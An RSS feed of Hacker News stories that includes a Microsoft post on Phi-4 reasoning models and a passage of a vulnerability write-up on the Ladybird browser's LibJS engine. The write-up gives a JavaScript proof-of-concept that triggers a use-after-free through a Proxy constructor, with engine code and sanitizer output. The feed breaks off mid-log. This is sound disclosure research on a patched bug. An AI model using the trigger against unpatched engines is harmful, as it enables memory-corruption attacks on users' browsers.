<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 01 May 2025 08:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Wyze pays $255k of tariffs on $167k of floodlights (111 pts)]]></title>
            <link>https://twitter.com/WyzeCam/status/1917662183036706849</link>
            <guid>43853188</guid>
            <pubDate>Thu, 01 May 2025 02:40:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/WyzeCam/status/1917662183036706849">https://twitter.com/WyzeCam/status/1917662183036706849</a>, See on <a href="https://news.ycombinator.com/item?id=43853188">Hacker News</a></p>
Couldn't get https://twitter.com/WyzeCam/status/1917662183036706849: Error: Request failed with status code 400]]></description>
        </item>
        <item>
            <title><![CDATA[Phi-4 Reasoning Models (106 pts)]]></title>
            <link>https://azure.microsoft.com/en-us/blog/one-year-of-phi-small-language-models-making-big-leaps-in-ai/</link>
            <guid>43852564</guid>
            <pubDate>Thu, 01 May 2025 01:02:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://azure.microsoft.com/en-us/blog/one-year-of-phi-small-language-models-making-big-leaps-in-ai/">https://azure.microsoft.com/en-us/blog/one-year-of-phi-small-language-models-making-big-leaps-in-ai/</a>, See on <a href="https://news.ycombinator.com/item?id=43852564">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-bi-an="Blog Body">
						
<article id="post-39977">

	
	<div>
		<p>
			Microsoft continues to add to the conversation by unveiling its newest models, Phi-4-reasoning, Phi-4-reasoning-plus, and Phi-4-mini-reasoning.&nbsp;		</p>
		
		
<p><strong>A new era of AI&nbsp;</strong></p>



<p>One year ago, Microsoft introduced <strong>small language models</strong> (SLMs) to customers with the release of <strong>Phi-3</strong> on <a href="https://ai.azure.com/?tid=72f988bf-86f1-41af-91ab-2d7cd011db47">Azure AI Foundry</a>, leveraging research on SLMs to expand the range of efficient AI models and tools available to customers.&nbsp;</p>



<p>Today, we are excited to introduce <strong>Phi-4-reasoning, Phi-4-reasoning-plus, and Phi-4-mini-reasoning</strong>â€”marking a new era for small language models and once again redefining what is possible with small and efficient AI.&nbsp;</p>







<h2 id="reasoning-models-the-next-step-forward">Reasoning models, the next step forward</h2>



<p><strong>Reasoning models</strong> are trained to leverage inference-time scaling to perform complex tasks that demand multi-step decomposition and internal reflection. They excel in mathematical reasoning and are emerging as the backbone of agentic applications with complex, multi-faceted tasks. Such capabilities are typically found only in large frontier models.&nbsp;Phi-reasoning models introduce a new category of small language models. Using distillation, reinforcement learning, and high-quality data, these models balance size and performance. They are small enough for low-latency environments yet maintain strong reasoning capabilities that rival much bigger models. This blend allows even resource-limited devices to perform complex reasoning tasks efficiently.</p>



<h2 id="phi-4-reasoning-and-phi-4-reasoning-plus">Phi-4-reasoning and Phi-4-reasoning-plus&nbsp;</h2>



<p><strong>Phi-4-reasoning </strong>is a 14-billion parameter open-weight reasoning model that rivals much larger models on complex reasoning tasks. Trained via supervised fine-tuning of Phi-4 on carefully curated reasoning demonstrations from OpenAI o3-mini, Phi-4-reasoning generates detailed reasoning chains that effectively leverage additional inference-time compute. The model demonstrates that meticulous data curation and high-quality synthetic datasets allow smaller models to compete with larger counterparts.</p>



<p>Phi-4-reasoning-plus builds upon Phi-4-reasoning capabilities, further trained with reinforcement learning to utilize more inference-time compute, using 1.5x more tokens than Phi-4-reasoning, to deliver higher accuracy.</p>



<p>Despite their significantly smaller size, both models achieve better performance than OpenAI o1-mini and DeepSeek-R1-Distill-Llama-70B at most benchmarks, including mathematical reasoning and Ph.D. level science questions. They achieve performance better than the full DeepSeek-R1 model (with 671-billion parameters) on the AIME 2025 test, the 2025 qualifier for the USA Math Olympiad. Both models are available on <a href="https://ai.azure.com/explore/models/Phi-4-reasoning/version/1/registry/azureml?tid=72f988bf-86f1-41af-91ab-2d7cd011db47">Azure AI Foundry</a> and HuggingFace.</p>



<figure><img decoding="async" src="https://azure.microsoft.com/en-us/blog/wp-content/uploads/2025/04/image-9-1024x416.webp" alt="A graph of different colored bars"><figcaption>Figure 1.â€¯Phi-4-reasoning performance across representative reasoning benchmarks spanning mathematical and scientific reasoning. We illustrate the performance gains from reasoning-focused post-training of Phi-4 via Phi-4-reasoning (SFT) and Phi-4-reasoning-plus (SFT+RL), alongside a representative set of baselines from two model families: open-weight models from DeepSeek including DeepSeek R1 (671B Mixture-of-Experts) and its distilled dense variant DeepSeek-R1 Distill Llama 70B, and OpenAIâ€™s proprietary frontier models o1-mini and o3-mini. Phi-4-reasoning and Phi-4-reasoning-plus consistently outperform the base model Phi-4 by significant margins, exceed DeepSeek-R1 Distill Llama 70B (5x larger)â€¯and demonstrate competitive performance against significantly larger models such as Deepseek-R1.</figcaption></figure>


<figure><img decoding="async" src="https://azure.microsoft.com/en-us/blog/wp-content/uploads/2025/05/image-2-1024x359.webp" alt="A graph of numbers and a number of people" srcset="https://azure.microsoft.com/en-us/blog/wp-content/uploads/2025/05/image-2-1024x359.webp 1024w, https://azure.microsoft.com/en-us/blog/wp-content/uploads/2025/05/image-2-300x105.webp 300w, https://azure.microsoft.com/en-us/blog/wp-content/uploads/2025/05/image-2-768x269.webp 768w, https://azure.microsoft.com/en-us/blog/wp-content/uploads/2025/05/image-2-1536x539.webp 1536w, https://azure.microsoft.com/en-us/blog/wp-content/uploads/2025/05/image-2.webp 1600w" data-orig-src="https://azure.microsoft.com/en-us/blog/wp-content/uploads/2025/05/image-2-1024x359.webp"><figcaption>Figure 2. Accuracy of models across general-purpose benchmarks for: long input context&nbsp;QA (FlenQA), instruction following (IFEval), Coding (HumanEvalPlus), knowledge &amp; language understanding (MMLUPro), safety detection (ToxiGen), and other general skills (ArenaHard and PhiBench).&nbsp;</figcaption></figure>



<p>Phi-4-reasoning models introduce a major improvement over Phi-4, surpass larger models like DeepSeek-R1-Distill-70B and approach Deep-Seek-R1 across various reasoning and general capabilities, including math, coding, algorithmic problem solving, and planning. The <a href="https://aka.ms/phi-reasoning/techreport" target="_blank" rel="noreferrer noopener">technical report</a> provides extensive quantitative evidence of these improvements through diverse reasoning tasks.</p>



<p>
<h2 id="phi-4-mini-reasoning">Phi-4-mini-reasoning</h2>
</p>



<p><strong>Phi-4-mini-reasoning</strong> is designed to meet the demand for a compact reasoning model. This transformer-based language model is optimized for mathematical reasoning, providing high-quality, step-by-step problem solving in environments with constrained computing or latency. Fine-tuned with synthetic data generated by Deepseek-R1 model, Phi-4-mini-reasoning balances efficiency with advanced reasoning ability. Itâ€™s ideal for educational applications, embedded tutoring, and lightweight deployment on edge or mobile systems, and is trained on over one million diverse math problems spanning multiple levels of difficulty from middle school to Ph.D. level.&nbsp;Try out the model on <a href="https://huggingface.co/microsoft/Phi-4-mini-reasoning/blob/main/Phi-4-Mini-Reasoning.pdf" target="_blank" rel="noreferrer noopener">Azure AI Foundry</a> or <a href="https://aka.ms/phi4-mini-reasoning/hf">HuggingFace</a> today.</p>



<figure><img decoding="async" src="https://azure.microsoft.com/en-us/blog/wp-content/uploads/2025/04/Screenshot-2025-04-30-193715-1024x328.webp" alt="A graph of numbers and a number of marks"><figcaption>Figure 3. The graph compares the performance of various models on popular math benchmarks for long sentence generation. Phi-4-mini-reasoning outperforms its base model on long sentence generation across each evaluation, as well as larger models like OpenThinker-7B, Llama-3.2-3B-instruct, DeepSeek-R1-Distill-Qwen-7B, DeepSeek-R1-Distill-Llama-8B, and Bespoke-Stratos-7B. Phi-4-mini-reasoning is comparable to OpenAI o1-mini across math benchmarks, surpassing the modelâ€™s performance during Math-500 and GPQA Diamond evaluations. As seen above, Phi-4-mini-reasoning with 3.8B parameters outperforms models of over twice its size.â€¯</figcaption></figure>



<p>For more information about the model, read theâ€¯<a href="https://aka.ms/phi-reasoning/techreport%22%20/t%20%22_blank" target="_blank" rel="noreferrer noopener">technical report</a> that provides additional quantitative insights.</p>







<p>Phiâ€™s evolution over the last year has continually pushed this envelope of quality vs. size, expanding the family with new features to address diverse needs.&nbsp;Across the scale of Windows 11 devices, these models are available to run locally on CPUs and GPUs.</p>



<p>As Windows works towards creating a new type of PC, Phi models have become an integral part of Copilot+ PCs with the NPU-optimized <a href="https://blogs.windows.com/windowsexperience/2024/12/06/phi-silica-small-but-mighty-on-device-slm/" target="_blank" rel="noreferrer noopener">Phi Silica variant</a>. This highly efficient and OS-managed version of Phi is designed to be preloaded in memory, and available with blazing fast time to first token responses, and power efficient token throughput so it can be concurrently invoked with other applications running on your PC.</p>



<p>It is used in core experiences like <a href="https://support.microsoft.com/en-us/windows/click-to-do-do-more-with-what-s-on-your-screen-6848b7d5-7fb0-4c43-b08a-443d6d3f5955" target="_blank" rel="noreferrer noopener">Click to Do</a>, providing useful text intelligence tools for any content on your screen, and is available as <a href="https://learn.microsoft.com/en-us/windows/ai/apis/phi-silica?tabs=csharp0%2Ccsharp1%2Ccsharp2%2Ccsharp3" target="_blank" rel="noreferrer noopener">developer APIs</a> to be readily integrated into applicationsâ€”already being used in several productivity applications like Outlook, offering its Copilot summary features offline.&nbsp;These small but mighty models have already been optimized and integrated to be used across several applications across the breadth of our PC ecosystem.&nbsp;The Phi-4-reasoning and Phi-4-mini-reasoning models leverage the low-bit optimizations for Phi Silica and will be available to run soon on Copilot+ PC NPUs.</p>



<h2 id="safety-and-microsoft-s-approach-to-responsible-ai">Safety and Microsoftâ€™s approach to responsible AI&nbsp;</h2>



<p>At Microsoft, <a href="https://www.microsoft.com/en-us/ai/responsible-ai?msockid=2e923f4e6e1064c017fe2d466fa365a3" target="_blank" rel="noreferrer noopener">responsible AI</a> is a fundamental principle guiding the development and deployment of AI systems, including our Phi models. Phi models are developed in accordance with Microsoft AI principles: accountability, transparency, fairness, reliability and safety, privacy and security, and inclusiveness.&nbsp;</p>



<p>The Phi family of models has adopted a robust safety post-training approach, leveraging a combination of Supervised Fine-Tuning (SFT), Direct Preference Optimization (DPO), and Reinforcement Learning from Human Feedback (RLHF) techniques. These methods utilize various datasets, including publicly available datasets focused on helpfulness and harmlessness, as well as various safety-related questions and answers. While the Phi family of models is designed to perform a wide range of tasks effectively, it is important to acknowledge that all AI models may exhibit limitations. To better understand these limitations and the measures in place to address them, please refer to the model cards below, which provide detailed information on responsible AI practices and guidelines.</p>







<h2 id="learn-more-here">Learn more here:&nbsp;</h2>



<ul>
<li>Try out the new models on <a href="https://aka.ms/try-phi" target="_blank" rel="noreferrer noopener">Azure AI Foundry</a>.</li>



<li>Read the <a href="https://aka.ms/phicookbook" target="_blank" rel="noreferrer noopener">Phi Cookbook</a>.</li>



<li>Read about <a href="https://aka.ms/PhiReasoningEdge" target="_blank" rel="noreferrer noopener">Phi reasoning models on edge devices</a>.</li>



<li>Learn more about <a href="https://huggingface.co/microsoft/Phi-4-mini-reasoning" target="_blank" rel="noreferrer noopener">Phi-4-mini-reasoning</a>.</li>



<li>Learn more about <a href="https://huggingface.co/microsoft/Phi-4-reasoning" target="_blank" rel="noreferrer noopener">Phi-4-reasoning</a>.</li>



<li>Learn more about <a href="https://huggingface.co/microsoft/Phi-4-reasoning-plus" target="_blank" rel="noreferrer noopener">Phi-4-reasoning-plus</a>.</li>
</ul>
			</div>

	
</article><!-- #post-39977 -->
			


					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[108B Pixel Scan of Johannes Vermeer's Girl with a Pearl Earring (192 pts)]]></title>
            <link>https://www.hirox-europe.com/gigapixel/girl-with-a-pearl-earring/</link>
            <guid>43852266</guid>
            <pubDate>Thu, 01 May 2025 00:22:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.hirox-europe.com/gigapixel/girl-with-a-pearl-earring/">https://www.hirox-europe.com/gigapixel/girl-with-a-pearl-earring/</a>, See on <a href="https://news.ycombinator.com/item?id=43852266">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Julia Parsons, U.S. Navy Code Breaker During World War II, Dies at 104 (123 pts)]]></title>
            <link>https://www.nytimes.com/2025/04/30/world/julia-parsons-dead.html</link>
            <guid>43852220</guid>
            <pubDate>Thu, 01 May 2025 00:16:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2025/04/30/world/julia-parsons-dead.html">https://www.nytimes.com/2025/04/30/world/julia-parsons-dead.html</a>, See on <a href="https://news.ycombinator.com/item?id=43852220">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2025/04/30/world/julia-parsons-dead.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Apple Violated Antitrust Ruling, Judge Finds (686 pts)]]></title>
            <link>https://www.wsj.com/tech/apple-violated-antitrust-ruling-federal-judge-finds-66b85957</link>
            <guid>43852145</guid>
            <pubDate>Thu, 01 May 2025 00:03:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/tech/apple-violated-antitrust-ruling-federal-judge-finds-66b85957">https://www.wsj.com/tech/apple-violated-antitrust-ruling-federal-judge-finds-66b85957</a>, See on <a href="https://news.ycombinator.com/item?id=43852145">Hacker News</a></p>
Couldn't get https://www.wsj.com/tech/apple-violated-antitrust-ruling-federal-judge-finds-66b85957: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[Pwning the Ladybird Browser (169 pts)]]></title>
            <link>https://jessie.cafe/posts/pwning-ladybirds-libjs/</link>
            <guid>43852096</guid>
            <pubDate>Wed, 30 Apr 2025 23:59:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/">https://jessie.cafe/posts/pwning-ladybirds-libjs/</a>, See on <a href="https://news.ycombinator.com/item?id=43852096">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2 id="intro">Intro</h2><p><a href="https://ladybird.org/">Ladybird</a> is a relatively new browser engine originating from the
<a href="https://github.com/SerenityOS/serenity">SerenityOS project</a>. Currently, itâ€™s in pre-alpha and improving quickly.
Take a look at the website and the GitHub for more information!</p><p>Iâ€™ll be researching the JavaScript engine of Ladybird,
<a href="https://github.com/LadybirdBrowser/ladybird/tree/278666edcd74/Libraries/LibJS">LibJS</a>.</p><h2 id="architecture">Architecture</h2><p>LibJS has an interpreter tier and no compilation tiers (yet!). It includes common modern JS engine<br>optimizations and is built with extensive verification checks across its critical code paths and data<br>structures, including vectors, making scenarios such as integer overflows leading to out-of-bounds<br>accesses harder to exploit.</p><h2 id="fuzzing">Fuzzing</h2><p>Weâ€™ll be using Fuzzilli, a popular fuzzer for JavaScript interpreters. Hereâ€™s the description from the GitHub:</p><blockquote>A (coverage-)guided fuzzer for dynamic language interpreters based on a custom
intermediate language ("FuzzIL") which can be mutated and translated to JavaScript.
<cite>- <a href="https://github.com/googleprojectzero/fuzzilli">Fuzzilli</a></cite></blockquote><p>Fuzzilli can be configured with additional code generators that can be specialized to trigger
specific bugs. LibJS isnâ€™t actively being OSS-fuzzed, so I didnâ€™t add any custom generators and hoped
there would be enough shallow bugs around. There was already some persistent fuzzing code
in LibJS. After some work â€” like needing to compile and link Skia with RTTI (Nix ðŸ’œ), fixing
some build scripts, and compiling Fuzzilli with an additional profile (again, Nix was great for this) â€” I
got it all working!</p><p>I ran the fuzzer for ~10 days and found 10 unique crashes. A lot of the bugs were boring:</p><ul><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/88c4f71114f7cfcf7e667eb07dae21553c0e10c6">Verification failure</a></li><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/911b9157637653c984ccbbd2c0b990499f5597a0">Stack exhaustion</a></li><li><a href="https://github.com/LadybirdBrowser/ladybird/pull/3615">OOM bugs</a></li><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/356728b1e0c33aac879db285302f067a694ad28f">Bad bytecode generation</a>.</li></ul><p>There were a few bugs that were more interesting:</p><ul><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/83e46b372815d28475269d04ca6b98e97861b33a">A caching bug in the regex parser</a></li><li><a href="https://github.com/LadybirdBrowser/ladybird/commit/f3a937ee769c2d9b4a78964641812171c4d03dd1">An integer overflow in <code>TypedArray</code></a></li></ul><p>Initially, I thought the regex bug was an integer overflowâ€¦ unfortunately, it wasnâ€™t. The real integer overflow<br>in <code>TypedArray</code> looked really promising â€” but it seems hard to exploit, with all the bounds checks protecting<br>vectors from bad accesses.</p><p>There were three bugs that looked really good: a heap buffer overflow, freelist corruption (or UAF) in the garbage
collector, and a heap use-after-free (UAF) in the malloc heap. But unfortunately, only the last UAF was reproducible outside of Fuzzilli.
<label for="sn-1"></label>

<span>I'm still not sure why the others didn't reproduce. <a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/heap-buff-overflow.js">This</a>
is the crash report for the
heap buffer overflow, and <a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/gc-uaf.js">this</a> is the one for the freelist corruption,
if interested.</span></p><h2 id="the-bug">The Bug</h2><h3 id="a-vulnerable-function">A Vulnerable Function</h3><p>The bug is a use-after-free (UAF) on the interpreterâ€™s argument buffer. Itâ€™s triggered by using a
proxied function object as a constructor, together with a malicious <code>[[Get]]</code> handler.</p><p>Consider the following JavaScript:</p><div><pre tabindex="0"><code data-lang="js"><span><span><span>function</span> <span>Construct</span>() {}
</span></span><span><span><span>new</span> <span>Construct</span>();
</span></span></code></pre></div><p>The semantics are outlined
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new#description">here</a>.</p><p>This is how itâ€™s implemented in Ladybird:</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>// 10.2.2 [[Construct]] ( argumentsList, newTarget )
</span></span></span><span><span><span></span>ThrowCompletionOr<span>&lt;</span>GC<span>::</span>Ref<span>&lt;</span>Object<span>&gt;&gt;</span> ECMAScriptFunctionObject<span>::</span>internal_construct(
</span></span><span><span>    ReadonlySpan<span>&lt;</span>Value<span>&gt;</span> arguments_list, <span>// [1]
</span></span></span><span><span><span></span>    FunctionObject<span>&amp;</span> new_target
</span></span><span><span>) {
</span></span><span><span>    <span>auto</span><span>&amp;</span> vm <span>=</span> <span>this</span><span>-&gt;</span>vm();
</span></span><span><span>
</span></span><span><span>    <span>// 1. Let callerContext be the running execution context.
</span></span></span><span><span><span></span>    <span>// NOTE: No-op, kept by the VM in its execution context stack.
</span></span></span><span><span><span></span>
</span></span><span><span>    <span>// 2. Let kind be F.[[ConstructorKind]].
</span></span></span><span><span><span></span>    <span>auto</span> kind <span>=</span> m_constructor_kind;
</span></span><span><span>
</span></span><span><span>    GC<span>::</span>Ptr<span>&lt;</span>Object<span>&gt;</span> this_argument;
</span></span><span><span>
</span></span><span><span>    <span>// 3. If kind is base, then
</span></span></span><span><span><span></span>    <span>if</span> (kind <span>==</span> ConstructorKind<span>::</span>Base) {
</span></span><span><span>        <span>// [2]
</span></span></span><span><span><span></span>        <span>// a. Let thisArgument be ? OrdinaryCreateFromConstructor(newTarget, "%Object.prototype%").
</span></span></span><span><span><span></span>        this_argument <span>=</span> TRY(ordinary_create_from_constructor<span>&lt;</span>Object<span>&gt;</span>(
</span></span><span><span>            vm,
</span></span><span><span>            new_target,
</span></span><span><span>            <span>&amp;</span>Intrinsics<span>::</span>object_prototype,
</span></span><span><span>            ConstructWithPrototypeTag<span>::</span>Tag
</span></span><span><span>        ));
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>auto</span> callee_context <span>=</span> ExecutionContext<span>::</span>create();
</span></span><span><span>
</span></span><span><span>    <span>// [3]
</span></span></span><span><span><span></span>    <span>// Non-standard
</span></span></span><span><span><span></span>    callee_context<span>-&gt;</span>arguments.ensure_capacity(max(arguments_list.size(), m_formal_parameters.size()));
</span></span><span><span>    callee_context<span>-&gt;</span>arguments.append(arguments_list.data(), arguments_list.size());
</span></span><span><span>    callee_context<span>-&gt;</span>passed_argument_count <span>=</span> arguments_list.size();
</span></span><span><span>    <span>if</span> (arguments_list.size() <span>&lt;</span> m_formal_parameters.size()) {
</span></span><span><span>        <span>for</span> (size_t i <span>=</span> arguments_list.size(); i <span>&lt;</span> m_formal_parameters.size(); <span>++</span>i)
</span></span><span><span>            callee_context<span>-&gt;</span>arguments.append(js_undefined());
</span></span><span><span>    }
</span></span><span><span>    <span>// [3 cont.] ...
</span></span></span></code></pre></div><p>The key parts are:</p><ul><li>First, it takes a reference to an argument buffer, <code>arguments_list</code>. [1]</li><li>Then, it creates a new object with the same prototype as the constructor function. [2]</li><li>Then, it executes the constructor with the arguments in <code>arguments_list</code>. [3]</li></ul><p>If the vector that <code>arguments_list</code> references is <code>free()</code>â€™d at any point between [1] and [3],
then <code>arguments_list</code> will dangle; and when itâ€™s used for the function call, it leads to a use-after-free.</p><p>Letâ€™s look at <code>ordinary_create_from_constructor</code>, called at [2]:</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>// 10.1.13 OrdinaryCreateFromConstructor ( constructor, intrinsicDefaultProto [ , internalSlotsList ] )
</span></span></span><span><span><span></span><span>template</span><span>&lt;</span><span>typename</span> T, <span>typename</span>... Args<span>&gt;</span>
</span></span><span><span>ThrowCompletionOr<span>&lt;</span>GC<span>::</span>Ref<span>&lt;</span>T<span>&gt;&gt;</span> ordinary_create_from_constructor(
</span></span><span><span>    VM<span>&amp;</span> vm,
</span></span><span><span>    FunctionObject <span>const</span><span>&amp;</span> constructor,
</span></span><span><span>    GC<span>::</span>Ref<span>&lt;</span>Object<span>&gt;</span> (Intrinsics<span>::*</span>intrinsic_default_prototype)(),
</span></span><span><span>    Args<span>&amp;&amp;</span>... args)
</span></span><span><span>{
</span></span><span><span>    <span>auto</span><span>&amp;</span> realm <span>=</span> <span>*</span>vm.current_realm();
</span></span><span><span>    <span>auto</span><span>*</span> prototype <span>=</span> TRY(get_prototype_from_constructor(vm, constructor, intrinsic_default_prototype));
</span></span><span><span>    <span>return</span> realm.create<span>&lt;</span>T<span>&gt;</span>(forward<span>&lt;</span>Args<span>&gt;</span>(args)..., <span>*</span>prototype);
</span></span><span><span>}
</span></span></code></pre></div><p>It does the following:</p><ul><li>Gets the prototype of the constructor function</li><li>Creates a new JavaScript object with that prototype</li></ul><p>Itâ€™s a simple method, but it can have side effects if the constructor happens to be a
<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">proxy object</a>.
If we override the constructor functionâ€™s <code>[[Get]]</code> internal method, the call to <code>get_prototype_from_constructor</code>
can execute arbitrary JavaScript code. This is useful if we can get that code to free the argument buffer.</p><h3 id="the-argument-buffer">The Argument Buffer</h3><p>The interpreter stores arguments for function calls in a vector called <code>m_argument_values_buffer</code>.
It can grow, shrink, be freed, or reallocated â€” and we have some control over when that happens.
For example, if the current buffer holds $5$ JS values, and we run:</p><div><pre tabindex="0"><code data-lang="js"><span><span><span>foo</span>(<span>1</span>, <span>2</span>, <span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>, <span>10</span>)
</span></span></code></pre></div><p>then the buffer will need to be freed and reallocated somewhere with space for 10 JS values.
Using this, we can free the interpreterâ€™s internal argument buffer â€” the same one that <code>arguments_list</code>
<em>still</em> points to â€” before itâ€™s used to set up the <code>callee_context</code> for the proceeding constructor call.</p><p>The fix is to do the prototype <code>[[Get]]</code> strictly <em>after</em> the callee context has been constructed.
<a href="https://github.com/LadybirdBrowser/ladybird/commit/f5a670421954fc7130c3685b713c621b29516669">Hereâ€™s</a>
the patch.</p><p>Hereâ€™s an example:</p><div><pre tabindex="0"><code data-lang="js"><span><span><span>function</span> <span>Construct</span>() {}
</span></span><span><span>
</span></span><span><span><span>let</span> <span>handler</span> <span>=</span> {
</span></span><span><span>    <span>get</span>() {
</span></span><span><span>        <span>function</span> <span>meow</span>() {}
</span></span><span><span>        <span>meow</span>(<span>0x41</span>, <span>0x41</span>, <span>0x41</span>);
</span></span><span><span>    }
</span></span><span><span>};
</span></span><span><span>
</span></span><span><span><span>let</span> <span>ConstructProxy</span> <span>=</span> <span>new</span> Proxy(<span>Construct</span>, <span>handler</span>);
</span></span><span><span>
</span></span><span><span><span>new</span> <span>ConstructProxy</span>(<span>0x41</span>);
</span></span></code></pre></div><p>We override <code>Construct</code>â€™s <code>[[Get]]</code> internal method with a function that tries to reallocate the
argument buffer. Then we invoke the constructor to trigger the bug.</p><div><pre tabindex="0"><code data-lang="python"><span><span><span>âžœ</span>  ladybird git:(b8fa355a21) <span>âœ—</span> js bug<span>.</span>js
</span></span><span><span><span>=================================================================</span>
</span></span><span><span><span>==</span><span>8726</span><span>==</span>ERROR: AddressSanitizer: heap<span>-</span>use<span>-</span>after<span>-</span>free on address <span>0x5020000038f0</span> at pc <span>0x7f98dd1bf19e</span> bp <span>0x7ffcc8ee2ef0</span> sp <span>0x7ffcc8ee2ee8</span>
</span></span><span><span>READ of size <span>8</span> at <span>0x5020000038f0</span> thread T0
</span></span><span><span>    <span>#0 0x7f98dd1bf19d  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xbbf19d)</span>
</span></span><span><span>    <span>#1 0x7f98dd1bdf8f  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xbbdf8f)</span>
</span></span><span><span>    <span>#2 0x7f98dd22a555  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc2a555)</span>
</span></span><span><span>    <span>#3 0x7f98dd539cdd  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xf39cdd)</span>
</span></span><span><span>    <span>#4 0x7f98dce78c0e  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x878c0e)</span>
</span></span><span><span>    <span>#5 0x7f98dcdcdc0a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7cdc0a)</span>
</span></span><span><span>    <span>#6 0x7f98dcdb818a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b818a)</span>
</span></span><span><span>    <span>#7 0x7f98dcdb6971  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b6971)</span>
</span></span><span><span>    <span>#8 0x562b5099e2a2  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1922a2)</span>
</span></span><span><span>    <span>#9 0x562b5099b114  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x18f114)</span>
</span></span><span><span>    <span>#10 0x562b509c1029  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x1b5029)</span>
</span></span><span><span>    <span>#11 0x7f98dae2a1fd  (/nix/store/rmy663w9p7xb202rcln4jjzmvivznmz8-glibc-2.40-66/lib/libc.so.6+0x2a1fd) (BuildId: 7b6bfe7530bfe8e5a757e1a1f880ed511d5bfaad)</span>
</span></span><span><span>    <span>#12 0x7f98dae2a2b8  (/nix/store/rmy663w9p7xb202rcln4jjzmvivznmz8-glibc-2.40-66/lib/libc.so.6+0x2a2b8) (BuildId: 7b6bfe7530bfe8e5a757e1a1f880ed511d5bfaad)</span>
</span></span><span><span>    <span>#13 0x562b5084ed14  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x42d14)</span>
</span></span><span><span>
</span></span><span><span><span>0x5020000038f0</span> <span>is</span> located <span>0</span> bytes inside of <span>16</span><span>-</span>byte region [<span>0x5020000038f0</span>,<span>0x502000003900</span>)
</span></span><span><span>freed by thread T0 here:
</span></span><span><span>    <span>#0 0x562b50940bf8  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/js+0x134bf8)</span>
</span></span><span><span>    <span>#1 0x7f98dcd39e1e  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x739e1e)</span>
</span></span><span><span>    <span>#2 0x7f98dcd3963d  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x73963d)</span>
</span></span><span><span>    <span>#3 0x7f98dce90c12  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x890c12)</span>
</span></span><span><span>    <span>#4 0x7f98dcdcd014  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7cd014)</span>
</span></span><span><span>    <span>#5 0x7f98dcdb818a  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0x7b818a)</span>
</span></span><span><span>    <span>#6 0x7f98dd228b7f  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc28b7f)</span>
</span></span><span><span>    <span>#7 0x7f98dd225cf6  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xc25cf6)</span>
</span></span><span><span>    <span>#8 0x7f98dd530b92  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xf30b92)</span>
</span></span><span><span>    <span>#9 0x7f98dd48e458  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xe8e458)</span>
</span></span><span><span>    <span>#10 0x7f98dd09a76f  (/home/jess/code/ladybird-flake/ladybird/Build/old/bin/../lib64/liblagom-js.so.0+0xa9a76f)</span>
